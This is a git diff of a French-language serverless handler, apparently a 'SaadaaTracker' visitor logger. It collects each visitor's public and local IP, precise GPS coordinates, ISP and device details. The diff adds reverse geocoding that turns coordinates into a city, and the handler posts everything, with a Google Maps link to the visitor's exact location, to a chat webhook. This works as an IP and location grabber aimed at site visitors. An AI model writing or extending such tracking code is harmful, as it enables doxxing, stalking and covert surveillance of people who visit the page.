@@ -17,11 +17,31 @@ export default async function handler(req, res) {
 
   const { localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
 
+  let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
+  
+  // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
+  if (preciseLocation) {
+    try {
+      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
+        headers: { 'User-Agent': 'SaadaaTracker/1.0' }
+      });
+      const revData = await revRes.json();
+      if (revData && revData.address) {
+        const city = revData.address.city || revData.address.town || revData.address.village || revData.address.municipality;
+        const county = revData.address.county || revData.address.state;
+        displayLocation = `📍 ${city || 'Ville inconnue'} (${county || ''}), ${revData.address.country}`;
+      }
+    } catch (e) {
+      console.error("Erreur reverse géo:", e);
+      displayLocation = `✅ GPS PRÉCIS (Coordonnées OK)`;
+    }
+  }
+
   const logEntry = {
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
     publicIp,
     localIp,
-    location: `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`,
+    location: displayLocation,
     isp: geo.isp || 'ISP inconnu',
     coords: preciseLocation ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
     isPrecise: !!preciseLocation,
@@ -39,8 +59,10 @@ export default async function handler(req, res) {
   
   if (webhookUrl) {
     const cleanCoords = logEntry.coords.replace(/\s/g, '');
-    const mapsLink = logEntry.isPrecise ? `\n📍 [Voir sur Google Maps](https://www.google.com/maps/search/?api=1&query=${cleanCoords})` : "";
-    const locValue = logEntry.isPrecise ? `✅ **GPS PRÉCIS**\n${logEntry.location}\nCoords: ${logEntry.coords}${mapsLink}` : `❌ IP Uniquement\n${logEntry.location}\nCoords: ${logEntry.coords}`;
+    const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
+    const locValue = logEntry.isPrecise 
+      ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
+      : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;
 
     try {
       await fetch(webhookUrl, {
@@ -49,12 +71,12 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           embeds: [{
             title: "🚀 Nouvelle Visite sur le Site !",
-            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500, // Vert pur si précis, Orange sinon
+            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
             fields: [
               { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
               { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
               { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
-              { name: "📍 Localisation", value: locValue },
+              { name: "📍 Localisation Précise", value: locValue },
               { name: "📡 Fournisseur (ISP)", value: logEntry.isp },
               { name: "📄 Page", value: logEntry.page },
               { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
